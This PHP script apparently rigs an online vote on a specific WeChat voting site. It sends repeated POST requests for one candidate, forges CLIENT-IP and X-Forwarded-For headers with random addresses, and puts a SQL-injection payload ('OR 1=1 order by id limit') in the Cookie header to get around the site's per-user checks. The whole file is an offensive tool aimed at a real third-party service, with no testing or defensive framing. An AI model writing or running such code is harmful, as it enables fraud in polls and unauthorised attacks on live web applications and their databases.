<?php
class Curl {
    private   $ch;
    private   $url = 'http://toupiao.wxtup.com/mobile.php?act=module&do=votes&name=multivote&weid=26&vid=13&zid=';
    private   $headerLog = '';
    private   $successLog = '';
    function __construct($uid = 67){
        $this->url =  $this->url.$uid;
        $this->ch = curl_init();
    }
    function __destruct(){
        curl_close($this->ch);
    }
    private function _sleepR(){
        sleep(rand(0,300));
    }
    private function __getValidIp(){
        $sec = rand(14,15);
        $third = rand(0,254);
        $fourth = rand(0,254);
        return '58.'.$sec.'.'.$third.'.'.$fourth;
    }
    private function _getHeader(){
        $num = rand(1000,99999);
        $num1 = $num+1;
        return array(
                "X-Requested-With:XMLHttpRequest",
                'Cookie:userid='.rand(1,9999).' */ OR 1=1 order by `id` limit '.$num.','.$num1.'; unionid=" /*',
                'CLIENT-IP:'.$this->__getValidIp(),
                'X-FORWARD-FOR:'.$this->__getValidIp()
            );

    }
    private function _setCurl(){
        curl_setopt($this->ch,CURLOPT_URL,$this->url);
        curl_setopt($this->ch, CURLOPT_HEADER, true);
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $this->_getHeader());
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_POST, 1);
    }
    private function _Log($h,$b){
        file_put_contents($this->headerLog,$h,FILE_APPEND);
        file_put_contents($this->successLog,$b,FILE_APPEND);
    }
    public function process(){
        //$this->sleepR();
        $this->_setCurl();
        $response = curl_exec($this->ch);
        if (curl_getinfo($this->ch, CURLINFO_HTTP_CODE) == '200') {
            $headerSize = curl_getinfo($this->ch, CURLINFO_HEADER_SIZE);
            $header = substr($response, 0, $headerSize);
            $body = json_decode(substr($response, $headerSize));
        }
        $this->_Log($header,$body->type);
        if($body->type == 'success'){
            print_r($body->type);
        }
    }
}
$C = new Curl('67');
$C->process();
?>
